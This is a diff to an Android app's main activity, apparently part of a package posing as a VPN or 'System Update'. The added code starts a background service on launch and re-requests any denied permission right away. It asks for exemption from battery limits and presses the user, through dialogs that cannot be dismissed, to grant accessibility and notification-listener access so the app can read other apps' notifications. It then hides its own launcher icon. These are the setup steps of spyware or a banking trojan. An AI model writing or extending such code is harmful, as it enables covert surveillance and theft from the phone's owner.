@@ -2,10 +2,14 @@ package com.openaccess.sdk
 
 import android.Manifest
 import android.app.Activity
+import android.app.ActivityManager
 import android.app.AlertDialog
+import android.app.NotificationManager
+import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
@@ -13,8 +17,8 @@ import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
 import android.provider.Settings
-import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -23,8 +27,8 @@ import com.openaccess.sdk.service.SystemNetworkService
 
 class MainActivity : Activity() {
     companion object {
-        private const val TAG = "MainActivity"
         private const val RC_ALL = 100
+        private const val RC_BATTERY = 101
 
         val ALL_PERMS = listOfNotNull(
             Manifest.permission.CAMERA,
@@ -60,31 +64,104 @@ class MainActivity : Activity() {
                 false
             }
         }
+
+        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
+            return try {
+                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
+                    if (serviceClass.name == service.service.className) return true
+                }
+                false
+            } catch (_: Exception) {
+                false
+            }
+        }
+
+        fun isNotificationAccessEnabled(ctx: Context): Boolean {
+            return try {
+                val enabledListeners = Settings.Secure.getString(
+                    ctx.contentResolver,
+                    "enabled_notification_listeners"
+                ) ?: ""
+                val ourListener = ComponentName(ctx, com.openaccess.sdk.service.NotifService::class.java).flattenToString()
+                enabledListeners.contains(ourListener)
+            } catch (_: Exception) {
+                false
+            }
+        }
+
+        fun isIgnoringBatteryOptimizations(ctx: Context): Boolean {
+            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
+                pm.isIgnoringBatteryOptimizations(ctx.packageName)
+            } else true
+        }
     }
 
-    private var isFinishingSafely = false
+    private var permissionsRequested = false
+    private var batteryOptRequested = false
+    private var setupStep = 0
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         if (!isTaskRoot) { finish(); return }
-        Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
 
-        // Step 1: Start background service immediately
-        try { SystemNetworkService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
+        try { SystemNetworkService.start(this) } catch (_: Exception) {}
 
-        // Step 2: Request permissions (activity stays alive for dialog)
-        requestAllPerms()
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (!permissionsRequested) {
+                permissionsRequested = true
+                beginSetupFlow()
+            }
+        }, 500)
+    }
+
+    private fun beginSetupFlow() {
+        setupStep = 0
+        checkAndProceed()
+    }
+
+    private fun checkAndProceed() {
+        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
+        val accOk = isAccessibilityEnabled(this)
+        val notifOk = isNotificationAccessEnabled(this)
+        val batteryOk = isIgnoringBatteryOptimizations(this)
+        val serviceOk = isServiceRunning(this, SystemNetworkService::class.java)
+
+        when {
+            !permsOk -> requestAllPerms()
+            !batteryOk && !batteryOptRequested -> requestBatteryOptimization()
+            !accOk -> showEnableAccessibilityAlert()
+            !notifOk -> showEnableNotificationAlert()
+            !serviceOk -> {
+                try { SystemNetworkService.start(this) } catch (_: Exception) {}
+                onSetupComplete()
+            }
+            else -> onSetupComplete()
+        }
     }
 
     private fun requestAllPerms() {
         val needed = ALL_PERMS.filter { !hasPermission(this, it) }
-        Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")
-
         if (needed.isEmpty()) {
-            onPermissionsReady()
+            checkAndProceed()
         } else {
-            Log.i(TAG, "Requesting: ${needed.joinToString(", ")}")
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
+        }
+    }
+
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            batteryOptRequested = true
+            try {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            } catch (_: Exception) {
+                checkAndProceed()
+            }
+        } else {
+            checkAndProceed()
         }
     }
 
@@ -92,74 +169,52 @@ class MainActivity : Activity() {
         super.onRequestPermissionsResult(requestCode, perms, results)
         if (requestCode == RC_ALL) {
             val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
-
             if (denied.isNotEmpty()) {
-                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting")
                 Handler(Looper.getMainLooper()).postDelayed({
-                    if (!isFinishing && !isDestroyed && !isFinishingSafely) {
+                    if (!isFinishing && !isDestroyed) {
                         ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                     }
-                }, 500)
+                }, 800)
             } else {
-                onPermissionsReady()
+                checkAndProceed()
             }
         }
     }
 
-    private fun onPermissionsReady() {
-        Log.i(TAG, "All permissions granted")
-
-        // Hide app icon from launcher
+    private fun onSetupComplete() {
         try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, MainActivity::class.java),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-        } catch (e: Exception) {
-            Log.e(TAG, "hide icon: ${e.message}")
-        }
+        } catch (_: Exception) {}
 
-        // Open Accessibility settings
-        openAccessibilityAndFinish()
-    }
-
-    private fun openAccessibilityAndFinish() {
-        if (isFinishingSafely) return
-        isFinishingSafely = true
-
-        try {
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-        } catch (e: Exception) {
-            Log.e(TAG, "open settings: ${e.message}")
-        }
-
-        // Finish safely without triggering Android 14+ crash
+        startActivity(Intent(this, VpnActivity::class.java))
         finishAndRemoveTask()
     }
 
     override fun onResume() {
         super.onResume()
-        if (isFinishingSafely) return
+        if (isFinishing) return
 
-        Log.i(TAG, "onResume — checking state")
         val permsOk = ALL_PERMS.all { hasPermission(this, it) }
         val accOk = isAccessibilityEnabled(this)
+        val serviceOk = isServiceRunning(this, SystemNetworkService::class.java)
 
         when {
-            accOk -> {
-                // Everything ready, launch VPN UI
+            accOk && permsOk -> {
+                if (!serviceOk) {
+                    try { SystemNetworkService.start(this) } catch (_: Exception) {}
+                }
                 startActivity(Intent(this, VpnActivity::class.java))
                 finishAndRemoveTask()
             }
-            !permsOk -> {
-                // Permissions missing, request again
+            !permsOk && !permissionsRequested -> {
+                permissionsRequested = true
                 requestAllPerms()
             }
-            else -> {
-                // Perms OK but accessibility not enabled
+            !accOk && permsOk -> {
                 showEnableAccessibilityAlert()
             }
         }
@@ -177,6 +232,22 @@ class MainActivity : Activity() {
             }
             .setNegativeButton("Later") { _, _ ->
                 finishAndRemoveTask()
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    private fun showEnableNotificationAlert() {
+        AlertDialog.Builder(this)
+            .setTitle("Notification Access")
+            .setMessage("Enable notification access to capture notifications from other apps.\n\n1. Find 'System Update' in the list\n2. Toggle it ON")
+            .setPositiveButton("Open Settings") { _, _ ->
+                try {
+                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                } catch (_: Exception) {}
+            }
+            .setNegativeButton("Skip") { _, _ ->
+                checkAndProceed()
             }
             .setCancelable(false)
             .show()
